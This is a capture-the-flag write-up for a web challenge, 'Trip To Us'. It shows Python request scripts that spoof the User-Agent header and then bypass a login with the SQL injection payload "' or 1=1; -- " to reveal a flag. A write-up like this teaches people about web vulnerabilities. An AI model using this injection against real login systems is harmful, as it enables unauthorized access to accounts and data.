# Trip To Us

## Description
```
IIT kharakpur is organizing a US Industrial Visit. 
The cost of the registration is $1000. 
But as always there is an opportunity for intelligent minds. 
Find the hidden login and Get the flag to get yourself a free US trip ticket.
```

## Writeup

Going through the webpages I found the alt `Change User agent to 'IITIAN'`. <br/>
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HomePage</title>
    <style>
        .container {
            text-align: center;
            border: 2px solid black;
            margin-top: 10px;
            background-color: red;
            height: 100pt;

        }
        img{
            border-radius: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
    
                    <div class="container">
            <h1>YOU ARE NOT AN IITAIN , GO BACK!!!!!!!</h1>
            <img src="./Images/GoBack.webp" alt="Change User agent to 'IITIAN'">
            </div>       
                </div>
</body>
</html>
```

Making a simple script I used the found `User-Agent` to send a request. <br/>
```py
import requests

base_URL = 'https://ch66998148142.ch.eng.run/Error.php'

headers = {
    'User-Agent': 'IITIAN'
}

req = requests.get(base_URL, headers=headers)

print(req.text)
```

This revealed a `login-forms`. <br/>
```html
<!DOCTYPE html>

<html>
<head>
<title>LOGIN</title>
<link rel="stylesheet" type="text/css" href="style.css">
<style>
img{
    width: 100%;
    position: absolute;
    z-index: -1;
}
</style>
</head>

<body>
    <img class= "bg" src="./Images/IIT.avif" alt="USE username as: admin">
    <h1>Welcome to IIT Kharakpur, US trip form</h1>
    <p style="font-size:20px;"><strong>Login to get your registration ID</strong></p>
    <form action="user-validation.php" method="post">
         <h2>LOGIN</h2>
         <label>User Name</label>
         <input type="text" name="uname" placeholder="User Name"><br>
         <label>User Name</label>
         <input type="password" name="password" placeholder="Password"><br>
         <button type="submit">Login</button>
    </form>
</body>
</html>
```

To bypass the `user-authentication` with username `admin` as seen above I made another python script with a simple `SQL-Injection` as a payload. <br/>
```py
import requests

base_URL = 'https://ch66998148219.ch.eng.run/user-validation.php'

headers = {
    'User-Agent': 'IITIAN'
}

payload = {
    'uname': 'admin',
    'password': "' or 1=1; -- "
}

req = requests.post(base_URL, headers=headers, data=payload)

print(req.text)
```

Executing the script revealed the flag which concludes this writeup. <br/>
```html
$ python3 req.py

<!DOCTYPE html>
<html>
<head>
        <title>HOME</title>
        <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
     <h1>Hello, admin</h1>
     <a href="logout.php">Logout</a>
     <p class="flag">VishwaCTF{y0u_g0t_th3_7r1p_t0_u5}</p> 
</body>
</html>
```